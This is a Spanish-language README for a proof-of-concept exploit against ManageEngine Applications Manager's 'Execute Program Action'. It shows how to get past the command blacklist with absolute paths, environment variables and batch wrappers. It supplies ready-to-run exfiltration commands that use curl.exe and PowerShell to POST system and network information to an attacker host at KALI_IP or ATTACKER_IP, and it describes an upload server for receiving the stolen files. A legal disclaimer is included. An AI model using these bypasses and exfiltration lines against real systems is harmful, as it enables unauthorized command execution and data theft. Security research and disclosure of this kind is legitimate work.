# Applications Manager - Execute Program Action Bypass PoC

![Security Research](https://img.shields.io/badge/Security-Research-red)
![Python 3.x](https://img.shields.io/badge/Python-3.x-blue)
![Proof of Concept](https://img.shields.io/badge/Proof%20of-Concept-orange)

## ğŸ“– DescripciÃ³n

Este repositorio contiene una Prueba de Concepto (PoC) que demuestra una vulnerabilidad de ejecuciÃ³n de comandos en la funciÃ³n "Execute Program Action" de ManageEngine Applications Manager.

## ğŸ” Detalles de la Vulnerabilidad

Applications Manager utiliza una lista negra (`BlackListCommands`) para bloquear comandos peligrosos, pero la validaciÃ³n tiene fallas crÃ­ticas:

- **ValidaciÃ³n basada en cadenas** solo en el primer token
- **Sin normalizaciÃ³n de rutas** o expansiÃ³n de variables de entorno
- **Sin protecciÃ³n** contra ejecuciÃ³n indirecta a travÃ©s de scripts

## ğŸš¨ MÃ©todos de Bypass

| MÃ©todo | Ejemplo |
|--------|---------|
| **Ruta Absoluta** | `C:\Windows\System32\netstat.exe` |
| **Variables de Entorno** | `%SystemRoot%\System32\netstat.exe` |
| **Script Wrapper** | `echo netstat > a.bat && a.bat` |

## ğŸ’¥ Impacto

- âœ… EjecuciÃ³n Remota de CÃ³digo (RCE) autenticada en el host de Applications Manager
- âœ… EjecuciÃ³n completa de comandos del sistema evadiendo restricciones de seguridad
- âœ… ExfiltraciÃ³n de datos usando utilidades del sistema (curl, powershell, certutil)

## ğŸ“¤ Ejemplo de Payload de ExfiltraciÃ³n

```cmd
C:\Windows\System32\netstat.exe > out.txt && C:\Windows\System32\curl.exe -X POST -F "file=@out.txt" http://[KALI_IP]:8000/upload
```

## ğŸ› ï¸ ConfiguraciÃ³n y Uso

### Prerequisitos

- Python 3.x
- Acceso de red a la instancia de Applications Manager objetivo
- Acceso autenticado con permisos de "Execute Program Action"

### Servidor de Carga de Archivos

El script `upload_server.py` proporciona un servidor HTTP simple para recibir archivos exfiltrados.

#### Uso BÃ¡sico

```bash
python3 upload_server.py
```

#### Opciones Avanzadas

```bash
python3 upload_server.py --host 0.0.0.0 --port 8000 --dir ./uploads
```

#### ParÃ¡metros

- `--host`: DirecciÃ³n de enlace (predeterminado: 0.0.0.0)
- `--port`: Puerto HTTP (predeterminado: 8000)
- `--dir`: Directorio de salida (predeterminado: directorio actual)

### API Endpoints

| MÃ©todo | Endpoint | DescripciÃ³n |
|--------|----------|-------------|
| **GET** | `/` | Lista archivos subidos recientemente |
| **POST** | `/upload` | Sube archivos (multipart/form-data) |
| **PUT** | `/upload/[filename]` | Carga directa de archivos |

### CaracterÃ­sticas de Seguridad

âœ… ProtecciÃ³n contra path traversal  
âœ… Nombres de archivo Ãºnicos con timestamp  
âœ… Registro de solicitudes con IP y User-Agent  
âœ… ValidaciÃ³n de tipo de contenido  

## ğŸ¯ Comandos de Prueba

Crea un archivo `test_commands.txt` con ejemplos de bypass:

```batch
# Bypass con ruta absoluta
C:\Windows\System32\whoami.exe
C:\Windows\System32\netstat.exe -an

# Bypass con variables de entorno
%SystemRoot%\System32\ipconfig.exe
%SystemRoot%\System32\systeminfo.exe

# Bypass con script wrapper
echo ipconfig > test.bat && test.bat
echo whoami > test.bat && call test.bat

# Ejemplos de exfiltraciÃ³n de datos
C:\Windows\System32\ipconfig.exe > network.txt && C:\Windows\System32\curl.exe -X POST -F "file=@network.txt" http://ATTACKER_IP:8000/upload
C:\Windows\System32\systeminfo.exe > system.txt && C:\Windows\System32\powershell.exe -c "Invoke-WebRequest -Uri http://ATTACKER_IP:8000/upload -Method POST -InFile system.txt"
```

## âš ï¸ Aviso Legal

**IMPORTANTE:** Esta herramienta se proporciona Ãºnicamente con fines educativos y de pruebas autorizadas.

âŒ **NO** usar en sistemas que no posea o no tenga permiso explÃ­cito para probar  
âŒ **NO** usar para ninguna actividad ilegal  
âœ… **SÃ** usar solo en entornos controlados para investigaciÃ³n de seguridad  
âœ… **SÃ** obtener autorizaciÃ³n adecuada antes de realizar pruebas  

El autor no es responsable de ningÃºn uso indebido de esta herramienta. Los usuarios asumen toda la responsabilidad y el riesgo.

## ğŸ“„ Licencia

Este proyecto es solo para fines de investigaciÃ³n y educativos. Todos los derechos reservados.

## ğŸ‘¨â€ğŸ’» Autor

Johan Aybar - Con fines educativos

---

**âš ï¸ RECORDATORIO:** Este PoC debe usarse Ãºnicamente en entornos de prueba autorizados. El uso no autorizado puede ser ilegal y estÃ¡ estrictamente prohibido.
